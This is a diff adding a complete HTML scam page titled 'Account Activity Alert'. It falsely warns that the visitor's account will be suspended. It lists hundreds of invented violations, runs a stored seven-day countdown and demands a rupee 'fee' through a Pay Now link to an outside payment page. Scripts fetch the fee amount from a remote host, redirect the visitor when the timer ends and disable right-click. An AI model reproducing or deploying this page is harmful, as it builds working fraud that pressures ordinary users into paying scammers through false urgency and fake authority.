@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Account Activity Alert</title>
+
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+        rel="stylesheet" crossorigin="anonymous" />
+  <link rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" />
+
+  <style>
+    :root {
+      --danger: #c82333;
+      --light-danger: #f8d7da;
+      --danger-border: #f5c6cb;
+      --success: #28a745;
+      --success-hover: #218838;
+      --bg: #f2f2f7;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--bg);
+      color: #000;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      font-size: 18px;
+      user-select: none;
+      padding: 10px;
+      overflow-x: hidden;
+    }
+
+    .container {
+      background: #fff;
+      padding: 24px;
+      border-radius: 16px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      border: 1px solid #e0e0e0;
+      max-width: 900px;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Floating iOS-style timer */
+    .floating-timer {
+      position: fixed;
+      top: 12px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--light-danger);
+      color: var(--danger);
+      padding: 8px 18px;
+      text-align: center;
+      font-weight: bold;
+      border-radius: 12px;
+      border: 1px solid var(--danger-border);
+      font-size: 16px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+      transition: transform 0.4s ease, opacity 0.4s ease;
+      z-index: 999;
+      animation: float 3s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translate(-50%, 0); }
+      50% { transform: translate(-50%, -3px); }
+    }
+
+    .floating-timer.hide {
+      transform: translate(-50%, -100%);
+      opacity: 0;
+    }
+
+    h1 {
+      font-size: 32px;
+      margin-bottom: 16px;
+      color: var(--danger);
+      margin-top: 60px;
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-top: 24px;
+      margin-bottom: 16px;
+      color: var(--danger);
+    }
+
+    p {
+      font-size: 20px;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+
+    .urgency-text {
+      color: var(--danger);
+      font-weight: bold;
+      margin-bottom: 20px;
+      background-color: var(--light-danger);
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid var(--danger-border);
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    ul {
+      list-style-type: disc;
+      padding-left: 24px;
+      font-size: 18px;
+      line-height: 1.6;
+    }
+
+    li {
+      margin-bottom: 8px;
+    }
+
+    .pay-button {
+      display: block;
+      background-color: var(--success);
+      color: white;
+      text-decoration: none;
+      text-align: center;
+      padding: 16px 32px;
+      border-radius: 12px;
+      font-size: 20px;
+      cursor: pointer;
+      width: 100%;
+      box-sizing: border-box;
+      margin-top: 24px;
+      transition: background 0.2s ease-in-out;
+    }
+
+    .pay-button:hover {
+      background-color: var(--success-hover);
+    }
+
+    .loading-indicator {
+      display: inline-block;
+      width: 1em;
+      height: 1em;
+      border: 3px solid rgba(0, 0, 0, 0.3);
+      border-radius: 50%;
+      border-top-color: #000;
+      animation: spin 1s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Responsive scaling */
+    @media (max-width: 768px) {
+      body { font-size: 17px; }
+      .container { padding: 20px; border-radius: 14px; }
+      h1 { font-size: 30px; }
+      h2 { font-size: 23px; }
+      p { font-size: 19px; }
+      ul { font-size: 17px; }
+      .pay-button { font-size: 19px; padding: 15px 30px; }
+    }
+
+    @media (max-width: 480px) {
+      .container { padding: 16px; border-radius: 12px; }
+      h1 { font-size: 28px; margin-top: 70px; }
+      p, ul { font-size: 17px; }
+      .floating-timer { font-size: 14px; padding: 6px 12px; top: 8px; }
+    }
+  </style>
+</head>
+
+<body oncontextmenu="return false;">
+  <!-- Floating Timer -->
+  <div class="floating-timer" id="floatingTimer">
+    ⏰ Time Remaining: <span id="timer">Loading...</span>
+  </div>
+
+  <div class="container" id="container">
+    <h1><i class="bi bi-exclamation-triangle-fill me-2"></i>Account Activity Alert</h1>
+
+    <p class="urgency-text">
+      <i class="bi bi-clock-history me-2"></i>
+      URGENT: Your account is at risk of permanently Suspended if not resolved within <b>7 Days</b>!
+    </p>
+
+    <p>
+      We noticed some weird stuff happening with your account. It might break our rules,
+      so we've put some limits on it for now. Don't worry, it's temporary – but you need to act fast!
+    </p>
+
+    <h2><i class="bi bi-question-circle-fill me-2"></i>Possible Reasons for Suspend Account</h2>
+    
+    <ul>
+<ul>
+  <li>Use of VPN or proxy services</li>
+  <li>logins from Multiple IP</li>
+  <li>Multiple logins from different devices</li>
+  <li>Spamming messages or fake profiles</li>
+  <li>Using automation, scripts, or bots</li>
+  <li>Reported by multiple users for violations</li>
+  <li>Sharing inappropriate or illegal content</li>
+  <li>Impersonating another person</li>
+  <li>Underage account detected</li>
+  <li>Selling or soliciting paid sexual services</li>
+  <li>Posting explicit nudity without consent</li>
+  <li>Doxxing or sharing private information</li>
+  <li>Threats or violent language</li>
+  <li>Hate speech or discriminatory content</li>
+  <li>Phishing or credential-stealing links</li>
+  <li>Malware distribution via messages</li>
+  <li>Excessive friend/connection requests</li>
+  <li>Using stolen photos or assets</li>
+  <li>Creating duplicate accounts to evade a ban</li>
+  <li>Using fake verification documents</li>
+  <li>Attempting payment fraud or chargebacks</li>
+  <li>Repeatedly violating community guidelines</li>
+  <li>Coordinated harassment campaigns</li>
+  <li>Recording calls without required consent</li>
+  <li>Caller-ID spoofing or falsifying origin</li>
+  <li>Mass unsolicited calls (robocalling)</li>
+  <li>Sharing child sexual content or minors</li>
+  <li>Non-consensual intimate media (revenge porn)</li>
+  <li>Facilitating human trafficking or exploitation</li>
+  <li>Sharing illegal drugs or sale arrangements</li>
+  <li>Providing instructions for committing crimes</li>
+  <li>Using platform to coordinate illegal activity</li>
+  <li>Using explicit sexual content in public profiles</li>
+  <li>Linking to external sites that break rules</li>
+  <li>Using the app for pyramid or MLM schemes</li>
+  <li>Selling counterfeit goods via messages</li>
+  <li>Intentionally evading location-based bans</li>
+  <li>Forging platform staff messages or badges</li>
+  <li>Manipulating ratings or reviews</li>
+  <li>Abusing in-app purchase/refund systems</li>
+  <li>Promoting self-harm or suicide methods</li>
+  <li>Encouraging dangerous activities</li>
+  <li>Excessive profanity targeted at users</li>
+  <li>Persistently ignoring moderation warnings</li>
+  <li>Misleading profile information (occupation, age)</li>
+  <li>Threatening to release private media</li>
+  <li>Attempting to bribe moderators or reviewers</li>
+  <li>Using the app as a marketplace for illicit services</li>
+  <li>Sextortion or blackmail attempts</li>
+  <li>Accessing another user’s account without consent</li>
+  <li>Sharing sexually explicit minors’ images (CSAM)</li>
+  <li>Organizing hate groups or extremist content</li>
+  <li>Coordinated fake reviews or engagement rings</li>
+  <li>Using bots to inflate view or like counts</li>
+  <li>Infringing copyrighted content distribution</li>
+  <li>Evading IP bans via frequent IP rotation</li>
+  <li>Operating multiple accounts for harassment</li>
+  <li>Selling account access or account takeover offers</li>
+  <li>Requesting or sharing bank or card details</li>
+  <li>Posting graphic violent content</li>
+  <li>Offering medical or legal advice without credentials</li>
+  <li>Misusing platform analytics or admin endpoints</li>
+  <li>Soliciting donations through impersonation</li>
+  <li>Deepfake images used to deceive users</li>
+  <li>Encouraging illegal hacking or exploits</li>
+  <li>Spreading false emergency information or hoaxes</li>
+  <li>Using third-party clients that violate terms</li>
+  <li>Posting private communications publicly</li>
+  <li>Sharing location of someone without consent</li>
+  <li>Arranging in-person meetups for exploitation</li>
+  <li>Obscene or sexual usernames/display names</li>
+  <li>Attempting to sell platform tokens off-app</li>
+  <li>Excessive account sharing across many people</li>
+  <li>Interfering with other users’ matches/connections</li>
+  <li>Manipulating search or discovery features</li>
+  <li>Coordinated fake identity networks (sockpuppets)</li>
+  <li>Attempting to bypass age gates or filters</li>
+  <li>Aggregating user data for resale</li>
+  <li>Using stolen payment methods to pay others</li>
+  <li>Repeatedly sending unsolicited images</li>
+  <li>Threatening legal action to intimidate staff</li>
+  <li>Abusing support channels for harassment</li>
+  <li>Posting copyrighted paywalled content freely</li>
+  <li>Distributing weapon instructions or procurement</li>
+  <li>Posting links to sexual exploitation forums</li>
+  <li>Using the platform for political bribery or influence</li>
+  <li>Sharing explicit fetish content against rules</li>
+  <li>Promoting extremist propaganda or recruitment</li>
+  <li>Selling personal data of other users</li>
+  <li>Soliciting minors or grooming behavior</li>
+  <li>False reports to weaponize moderation systems</li>
+  <li>Using the app to stalk users across services</li>
+  <li>Exploiting referral programs fraudulently</li>
+  <li>Tampering with client-side code to cheat features</li>
+  <li>Hijacking verified badges via fraud</li>
+  <li>Misleading product/service endorsements (astroturfing)</li>
+  <li>Operating call centers to harass users</li>
+  <li>Illicitly recording and selling conversations</li>
+  <li>Pretending to be law enforcement to coerce users</li>
+  <li>Posting coordinates to illegal activities/sites</li>
+  <li>Using encrypted channels to evade moderation</li>
+  <li>Providing counterfeit IDs for verification bypass</li>
+  <li>Coordinated doxx-and-shame campaigns</li>
+  <li>Using sexual content to extort users for money</li>
+  <li>Selling access to private groups or chats illegally</li>
+  <li>Misrepresenting professional credentials to users</li>
+  <li>Creating pornographic content with non-consenting people</li>
+  <li>Using the platform to traffic stolen financial data</li>
+  <li>Hosting or linking to live sexual performances violating rules</li>
+  <li>Requesting explicit media from minors</li>
+  <li>Persistent social engineering attempts</li>
+  <li>Uploading extremely large files to disrupt service</li>
+  <li>Using automated translation to mislead users</li>
+  <li>Abusing geofencing to target harassment</li>
+  <li>False charity solicitations or fake crowdfunding</li>
+  <li>Posting content that incites imminent lawless action</li>
+  <li>Selling or promoting gambling in prohibited regions</li>
+  <li>Uploading doctored evidence to manipulate disputes</li>
+  <li>Coordinating false-flag operations against competitors</li>
+  <li>Using platform to organize trespass or vandalism</li>
+  <li>Sharing links to leaked password-protected databases</li>
+  <li>Account takeover attempts via credential stuffing</li>
+  <li>SIM swapping or number hijacking attempts</li>
+  <li>Using disposable email services to create accounts</li>
+  <li>Using throwaway phone numbers to avoid verification</li>
+  <li>Frequent profile content that violates decency rules</li>
+  <li>Manipulating engagement through paid click farms</li>
+  <li>Automated scraping of user data or profiles</li>
+  <li>Using browser extensions to alter app behavior</li>
+  <li>Running unauthorized background processes on app</li>
+  <li>Sharing instructions for building weapons</li>
+  <li>Providing false medical test results or certifications</li>
+  <li>Coercing users into financial transactions</li>
+  <li>Organizing illegal gambling rings via chats</li>
+  <li>Posting excessive adult content in public comments</li>
+  <li>Exfiltrating platform content for resale</li>
+  <li>Using the app to coordinate fraud schemes</li>
+  <li>Sharing manipulated imagery for deception</li>
+  <li>Exploiting bugs for personal gain</li>
+  <li>Unauthorized use of platform APIs for mass actions</li>
+  <li>Bypassing rate limits through proxies</li>
+  <li>Using harvested contact lists for spam</li>
+  <li>Transmitting personally identifiable information without consent</li>
+  <li>Threatening or encouraging self-harm in others</li>
+  <li>Using the app to plan violent crimes</li>
+  <li>Posting graphic gore or dismemberment content</li>
+  <li>Using sexual content in profile pictures</li>
+  <li>Sharing copyrighted music or videos illegally</li>
+  <li>Offering or requesting illicit financial instruments</li>
+  <li>Using the app to facilitate identity theft</li>
+  <li>Trading login credentials with others</li>
+  <li>Using platform for revenge or harassment campaigns</li>
+  <li>Creating profiles that replicate minors’ accounts</li>
+  <li>Impersonating official organizations or brands</li>
+  <li>Providing fake news posing as factual reporting</li>
+  <li>Encouraging eating disorders or self-harm practices</li>
+  <li>Using platform to coordinate illegal protests</li>
+  <li>Posting threats of mass violence</li>
+  <li>Using adult content to recruit underage users</li>
+  <li>Manipulating user trust via fake testimonials</li>
+  <li>Offering fake scholarships or job scams</li>
+  <li>Using the app for insider trading tips</li>
+  <li>Selling forged academic credentials</li>
+  <li>Operating a fake charity through the app</li>
+  <li>Uploading illicit pornography for distribution</li>
+  <li>Sharing abuse images of vulnerable adults</li>
+  <li>Using the app to arrange bribery or corruption</li>
+  <li>Posting coordinates to places of criminal activity</li>
+  <li>Using multiple accounts to vote/manipulate polls</li>
+  <li>Sharing gambling cheats or exploits</li>
+  <li>Using the platform to coordinate spyware installs</li>
+  <li>Posting private pictures taken without permission</li>
+  <li>Advertising illegal streaming or pirate services</li>
+  <li>Providing instructions for evading law enforcement</li>
+  <li>Using the app to coordinate vehicle theft</li>
+  <li>Offering fake product refunds or reimbursements</li>
+  <li>Posting material that promotes animal abuse</li>
+  <li>Maintaining a database of stolen credentials</li>
+  <li>Operating a resale market for stolen goods</li>
+  <li>Offering fake investment opportunities</li>
+  <li>Using the platform to run romance scams</li>
+  <li>Sharing location-tracking tools for stalking</li>
+  <li>Mass following/unfollowing to manipulate metrics</li>
+  <li>Using unauthorized webhooks to collect data</li>
+  <li>Publishing private chat logs without consent</li>
+  <li>Offering services to bypass background checks</li>
+  <li>Operating affiliate fraud networks via links</li>
+  <li>Using the app to recruit for illegal gangs</li>
+  <li>Sharing instructions to make explosives</li>
+  <li>Posting adult content to public feeds repeatedly</li>
+  <li>Using derogatory slurs to harass protected groups</li>
+  <li>Offering fake customer support to harvest data</li>
+  <li>Misusing promotional credits for unauthorized purposes</li>
+  <li>Using platform to coordinate blackmail schemes</li>
+  <li>Posting fabricated legal documents to deceive users</li>
+  <li>Offering fake driver or ID licenses</li>
+  <li>Operating phishing pages hosted off-platform</li>
+  <li>Requesting remote access to users' devices</li>
+  <li>Encouraging or organizing hate-driven violence</li>
+  <li>Posting links to illegal marketplaces</li>
+  <li>Using proxy networks to mask coordinated abuse</li>
+  <li>Sharing ransomware or extortion tools</li>
+  <li>Using the app to plan large-scale fraud</li>
+  <li>Offering to buy or sell biometric data</li>
+  <li>Offering services to launder money</li>
+  <li>Using fake personas to groom targets</li>
+  <li>Posting copyrighted e-books or manuals without permission</li>
+  <li>Organizing ticket scalping or illegal resale</li>
+  <li>Using the platform to coordinate hate raids</li>
+  <li>Creating countdowns to violent acts</li>
+  <li>Posting sensational false claims to manipulate markets</li>
+  <li>Using the app to facilitate trespassing</li>
+  <li>Sharing image-edit tools to produce fake IDs</li>
+  <li>Offering to fix or sanitize criminal records</li>
+  <li>Posting instructions for illicit software cracks</li>
+  <li>Misleading users with fake verification statuses</li>
+  <li>Using the app to operate an escort or pimping network</li>
+  <li>Publishing extremist training content</li>
+  <li>Creating content that promotes child abuse</li>
+  <li>Posting or linking to hacked account lists</li>
+  <li>Running coordinated smear campaigns</li>
+  <li>Using the app to solicit sex from minors</li>
+  <li>Sharing unauthorized livestreams of private events</li>
+  <li>Offering counterfeit merchandise for sale</li>
+  <li>Posting medical misinformation causing harm</li>
+  <li>Promoting unsafe DIY medical procedures</li>
+  <li>Using the app to run fake surveys for data harvesting</li>
+  <li>Uploading audio to impersonate others</li>
+  <li>Using the app to coordinate phishing by phone</li>
+  <li>Soliciting or sharing non-consensual sexual images</li>
+  <li>Offering to sell software licenses illegally</li>
+  <li>Using the platform for child exploitation networks</li>
+  <li>Posting sexual content involving animals (bestiality)</li>
+  <li>Promoting or coordinating hazing rituals</li>
+  <li>Using the app to orchestrate fraud against seniors</li>
+  <li>Sharing or trading hacked streaming credentials</li>
+  <li>Selling or advertising spyware or stalkerware</li>
+  <li>Using the app to coordinate arson or sabotage</li>
+  <li>Posting manipulated election-related content</li>
+  <li>Operating ticketing scams or fake events</li>
+  <li>Using bots to perform financial transactions</li>
+  <li>Creating fake job listings to scam applicants</li>
+  <li>Posting content that sexually exploits young adults</li>
+  <li>Attempting to reverse-engineer encryption on platform</li>
+  <li>Misusing mass messaging for political manipulation</li>
+  <li>Posting illicit substance manufacturing instructions</li>
+  <li>Offering to falsify academic records for payment</li>
+  <li>Coordinating trespass or property damage events</li>
+  <li>Encouraging animal trafficking or illegal wildlife trade</li>
+  <li>Operating as a middleman for illegal sales</li>
+  <li>Using the app to promote fraudulent charities</li>
+  <li>Uploading hidden-distribution pornographic material</li>
+  <li>Posting images that facilitate identity theft</li>
+  <li>Sharing accounts across many unrelated users</li>
+  <li>Using the app to collect victims' personal photos</li>
+  <li>Offering to sell falsified health certificates</li>
+  <li>Promoting use of unlicensed prescription drugs</li>
+  <li>Posting material that incites mass panic</li>
+  <li>Operating a fake escrow or payment service</li>
+  <li>Using the app to solicit ransom payments</li>
+  <li>Posting content that glorifies torture</li>
+  <li>Using the app to coordinate illegal border crossings</li>
+  <li>Requesting or sharing intimate images without consent</li>
+  <li>Using the app to host hate-themed discussion groups</li>
+  <li>Posturing as an emergency responder to deceive users</li>
+  <li>Operating an illegal debt-collection scheme</li>
+  <li>Using the app to distribute illicit pornography for profit</li>
+  <li>Sharing instructions to create forged documents</li>
+  <li>Posting content that identifies victims of crimes</li>
+  <li>Using the platform to solicit organ or tissue trade</li>
+  <li>Sharing extremist recruitment contact details</li>
+  <li>Using the app to identify vulnerable victims for scams</li>
+  <li>Offering fake follower or subscriber packages</li>
+  <li>Posting fabricated academic research or results</li>
+  <li>Operating a ring of fake influencers for promotion</li>
+  <li>Using the app to coordinate impersonation scams</li>
+  <li>Sharing private meeting recordings without consent</li>
+  <li>Using the app to run an illegal gambling operation</li>
+  <li>Posting sexual content of non-consenting adults</li>
+  <li>Offering forged legal advice to mislead users</li>
+  <li>Using the app to coordinate serial harassment</li>
+  <li>Selling access to stolen cloud storage links</li>
+  <li>Posting images that facilitate revenge or shaming</li>
+  <li>Sharing explicit simulated content presented as real</li>
+  <li>Operating a phone farm to manipulate rankings</li>
+  <li>Using the app to coordinate mail or package theft</li>
+  <li>Posting medical test results of others without consent</li>
+  <li>Promoting high-risk/investment pump-and-dump schemes</li>
+  <li>Using the app to traffic illegal prescription drugs</li>
+  <li>Coordinating fraudulent warranty or refund claims</li>
+  <li>Using the platform to solicit fraudulent tax returns</li>
+  <li>Sharing images of non-consenting people in explicit acts</li>
+  <li>Posting content that enables stalking via metadata</li>
+  <li>Operating as a broker for illegal personal data</li>
+  <li>Using the app to recruit children into illicit groups</li>
+  <li>Posting instructions to disable safety features</li>
+  <li>Promoting unsafe extreme dieting or fasting methods</li>
+  <li>Using the app to sell expired or adulterated products</li>
+  <li>Sharing false employment references to defraud employers</li>
+  <li>Offering to launder proceeds from cybercrime</li>
+  <li>Using the app to provide insider sports betting tips</li>
+  <li>Posting sexually exploitative text targeted at minors</li>
+  <li>Operating a coordinated refund scam with vendors</li>
+  <li>Posting graphics that facilitate doxxing operations</li>
+  <li>Using the app to coordinate illegal scrap metal theft</li>
+  <li>Offering to remove negative reviews for payment</li>
+  <li>Using fake ID photos of public officials</li>
+  <li>Running a network to sell fake social proof</li>
+  <li>Posting instructions for tampering with safety labels</li>
+  <li>Using the app to distribute counterfeit currency schemes</li>
+  <li>Impersonating medical professionals to prescribe treatments</li>
+  <li>Creating and selling fake social media verifications</li>
+  <li>Using the app to coordinate fraudulent insurance claims</li>
+  <li>Posting videos staged as real crimes to deceive users</li>
+  <li>Using the platform to promote hate-based merchandise</li>
+  <li>Sharing map links to hidden illegal dumping sites</li>
+  <li>Operating a network of fake tutors to scam students</li>
+  <li>Using stolen loyalty points or gift credits</li>
+  <li>Posting manipulated videos to misrepresent events</li>
+  <li>Using the app to coordinate unauthorized surveillance</li>
+  <li>Offering to create fake backgrounds for visas or travel</li>
+  <li>Posting sensitive government or classified material</li>
+  <li>Using the app to solicit others to commit perjury</li>
+  <li>Organizing targeted false allegations against individuals</li>
+  <li>Using the platform to run an illegal adoption ring</li>
+  <li>Sharing instructions for fabricating forensic evidence</li>
+  <li>Operating a scheme to resell stolen tickets</li>
+  <li>Posting details of private security vulnerabilities</li>
+  <li>Using the platform to coordinate bribery in tenders</li>
+  <li>Offering to forge court documents or affidavits</li>
+  <li>Using the app to sell or distribute illegal pesticides</li>
+  <li>Posting hyper-localized threats to intimidate communities</li>
+  <li>Operating as a middleman for stolen vehicle parts</li>
+  <li>Sharing sexual content under a false age claim</li>
+  <li>Using the app to disseminate banned political propaganda</li>
+  <li>Promoting the manufacture of prohibited chemical agents</li>
+  <li>Using the platform to run a scam investment fund</li>
+  <li>Offering to alter official timestamps for a fee</li>
+  <li>Posting links to sites that host illegal file-sharing</li>
+  <li>Using the app to coordinate counterfeit ticket creation</li>
+  <li>Sharing tools to bypass digital rights management</li>
+  <li>Operating a service to fake biometric authentication</li>
+  <li>Using the platform to arrange illegal surveillance for hire</li>
+  <li>Posting content that reveals victims of trafficking</li>
+  <li>Using the app to offer illegal matchmaking for underage users</li>
+  <li>Sharing step-by-step guides to commit identity fraud</li>
+  <li>Using the platform to coordinate fraudulent clinical trials</li>
+  <li>Posting solicitations for illegal organ donors</li>
+  <li>Operating a network that rents out hacked accounts</li>
+  <li>Using the app to coordinate theft of intellectual property</li>
+  <li>Posting explicit content in titles or previews</li>
+  <li>Using forged corporate emails to deceive employees</li>
+  <li>Operating a botnet command-and-control via messages</li>
+  <li>Posting content that endangers rescue or emergency workers</li>
+  <li>Using the app to coordinate sale of stolen IDs</li>
+  <li>Sharing exploit kits or zero-day distribution</li>
+  <li>Using the platform to offer services for illegal evictions</li>
+  <li>Posting instructions to bypass child-safe filters</li>
+  <li>Using the app to solicit stolen or cloned credit cards</li>
+  <li>Operating a service to manufacture fake background checks</li>
+  <li>Sharing instructions to poison or contaminate food</li>
+  <li>Using platform messaging to coordinate illicit barter networks</li>
+  <li>Posting sexual content disguised as art to evade rules</li>
+  <li>Using the app to provide courier services for illegal goods</li>
+  <li>Sharing insider exam answers or test leaks for sale</li>
+  <li>Using the platform to run a chain-letter financial scheme</li>
+  <li>Posting images that facilitate facial recognition abuse</li>
+  <li>Operating a fraudulent accommodation rental scheme</li>
+  <li>Using the app to coordinate unauthorized drone operations</li>
+  <li>Offering to create false alibis or timelines</li>
+  <li>Sharing instructions for altering VIN or serial numbers</li>
+  <li>Using the platform to coordinate mass reselling of restricted items</li>
+  <li>Posting explicit fetish recruitment targeted at vulnerable groups</li>
+  <li>Using the app to run a scheme selling fake warranties</li>
+  <li>Offering to help users avoid legal subpoenas</li>
+  <li>Posting guides for fabricating tax documents</li>
+  <li>Using platform groups to distribute illicit prescription drugs</li>
+  <li>Offering to manufacture false business registrations</li>
+  <li>Posting deepfake sexual content without consent</li>
+  <li>Using the app to coordinate ticket botting for events</li>
+  <li>Sharing manuals to bypass vehicle immobilizers</li>
+  <li>Operating a scheme to falsify workplace accidents for claims</li>
+  <li>Using the app to broker illegal surveillance footage sales</li>
+  <li>Posting content encouraging the theft of cultural artifacts</li>
+  <li>Operating as an unlicensed medical practitioner via the app</li>
+  <li>Offering to falsify vaccine or test records</li>
+  <li>Using the platform to coordinate illicit salvage operations</li>
+  <li>Posting sexualized content that sexualizes minors indirectly</li>
+  <li>Using the app to coordinate extortion via doxxed data</li>
+  <li>Offering to buy back leaked or stolen information</li>
+  <li>Posting images or instructions that facilitate organized crime</li>
+  <li>Using the app to rent out accounts for fraudulent reviews</li>
+  <li>Creating fake emergency alerts to prompt panic</li>
+  <li>Operating a network that sells forged business credentials</li>
+  <li>Using the platform to coordinate illegal export/import operations</li>
+  <li>Offering to create fraudulent proof of residency</li>
+  <li>Posting disallowed sexually explicit roleplay soliciting minors</li>
+  <li>Using the app to sell access to insider corporate secrets</li>
+  <li>Operating a professional scammer-for-hire service</li>
+  <li>Posting disguised recruitment materials for terrorist groups</li>
+  <li>Using the platform to run an illegal data-broker service</li>
+  <li>Sharing instructions to create fraudulent identification chips</li>
+  <li>Using the app to coordinate bribery in private contracts</li>
+  <li>Offering to launder cryptocurrency for illicit sources</li>
+  <li>Posting violent extremist manuals or how-to guides</li>
+  <li>Using the platform to organize forced labor operations</li>
+  <li>Providing access to child exploitation hubs</li>
+  <li>Using the app to arrange illegal surrogacy or child sales</li>
+  <li>Posting content that instructs others to commit murder</li>
+  <li>Operating a darknet marketplace referral service</li>
+  <li>Using the platform to coordinate illegal arms brokering</li>
+  <li>Sharing stolen government documents or IDs</li>
+  <li>Providing services to tamper with forensic evidence</li>
+  <li>Using the app to run a scam phishing-as-a-service</li>
+  <li>Posting content to incite mass ethnic cleansing</li>
+  <li>Operating a recruitment funnel for violent extremists</li>
+  <li>Using the app to organize kidnapping or ransom operations</li>
+  <li>Sharing instructions to create illegal surveillance devices</li>
+  <li>Using the platform to sell access to private surveillance footage</li>
+  <li>Offering to coordinate illegal organ transplant logistics</li>
+  <li>Posting instructions to make illegal chemical agents</li>
+  <li>Using the app to coordinate human smuggling networks</li>
+  <li>Offering to fabricate forensic DNA evidence</li>
+  <li>Using the platform to trade stolen military or defense data</li>
+  <li>Posting tutorial content for making virulent biological agents</li>
+  <li>Operating a service that brokers illegal wildlife trafficking</li>
+  <li>Using the app to coordinate large-scale utility sabotage</li>
+  <li>Posting content that openly solicits assassination services</li>
+  <li>Operating a service to distribute illegal radiation sources</li>
+  <li>Using the platform to coordinate acts of terrorism</li>
+  <li>Sharing operational manuals for paramilitary activities</li>
+  <li>Posting solicitation for mercenary or illegal combatant services</li>
+  <li>Using the app to sell classified national security information</li>
+  <li>Offering logistics support for cross-border criminal networks</li>
+  <li>Posting content that provides step-by-step terror attack planning</li>
+</ul>
+
+    </ul>
+
+    <h2><i class="bi bi-unlock-fill me-2"></i>How to Fix This</h2>
+    <p class="urgency-text">
+      <i class="bi bi-exclamation-circle-fill me-2"></i>
+      Time is running out! Pay now to instantly unblock your account.
+    </p>
+
+    <p>
+      To get your account back, pay the small fee of
+      <span id="amount">₹<span class="loading-indicator"></span></span>.
+      It’s quick and secure.
+    </p>
+
+    <a href="https://himanpayment2checkout.pages.dev/Contact" class="pay-button">
+      <i class="bi bi-credit-card me-2"></i>Pay Now
+    </a>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
+          crossorigin="anonymous"></script>
+
+  <script>
+    // === 7-Day Timer ===
+    const timerElement = document.getElementById("timer");
+    const duration = 7 * 24 * 60 * 60 * 1000; // 7 days in ms
+    let startTime = localStorage.getItem("activationStart");
+
+    if (!startTime) {
+      startTime = Date.now();
+      localStorage.setItem("activationStart", startTime);
+    } else {
+      startTime = parseInt(startTime, 10);
+    }
+
+    const endTime = startTime + duration;
+
+    function updateTimer() {
+      const now = Date.now();
+      const remaining = endTime - now;
+
+      if (remaining <= 0) {
+        window.location.href =
+          "https://zufvoql5xqh6d1zljquitd1uwteyswvkqwcexlsprjnit5f46blnxe4f3t.pages.dev/Logout.html";
+        return;
+      }
+
+      const days = Math.floor(remaining / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((remaining / (1000 * 60 * 60)) % 24);
+      const minutes = Math.floor((remaining / (1000 * 60)) % 60);
+      const seconds = Math.floor((remaining / 1000) % 60);
+
+      timerElement.textContent = `${days}d : ${hours}h : ${minutes}m : ${seconds}s`;
+      requestAnimationFrame(updateTimer);
+    }
+    updateTimer();
+
+    // === Fetch penalty data ===
+    document.addEventListener("DOMContentLoaded", () => {
+      const amountSpan = document.getElementById("amount");
+      fetch("https://syncjson.pages.dev/Penalty.json")
+        .then(res => res.json())
+        .then(data => {
+          amountSpan.innerText = "₹" + data.penalty;
+        })
+        .catch(() => {
+          amountSpan.innerText = "₹1999";
+        });
+    });
+
+    // === iOS-like slide hide/show on scroll ===
+    let lastScroll = 0;
+    const floatingTimer = document.getElementById("floatingTimer");
+
+    window.addEventListener("scroll", () => {
+      const currentScroll = window.pageYOffset || document.documentElement.scrollTop;
+      if (currentScroll > lastScroll + 10) {
+        // scrolling down
+        floatingTimer.classList.add("hide");
+      } else if (currentScroll < lastScroll - 10) {
+        // scrolling up
+        floatingTimer.classList.remove("hide");
+      }
+      lastScroll = currentScroll <= 0 ? 0 : currentScroll; // avoid negative
+    });
+  </script>
+</body>
+</html>
